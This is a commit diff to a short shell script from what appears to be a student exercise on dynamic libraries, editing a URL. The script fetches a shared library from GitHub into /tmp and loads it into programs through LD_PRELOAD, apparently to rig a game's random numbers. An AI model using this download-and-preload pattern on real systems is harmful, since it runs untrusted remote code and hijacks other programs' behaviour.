ca755c35ab0e6caa662960a7a5896db447fd4be5
Robel <106760748+Linco9ine@users.noreply.github.com>
2022-10-07 19:56:56 +0300

    dynamic lib

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
- wget -P /tmp/nrandom.so https://github.com/Linco9ine/raw/master/nrandom.so
+ wget -P /tmp/nrandom.so https://@github.com/Linco9ine/raw/master/nrandom.so
  export LD_PRELOAD=/tmp/nrandom.so
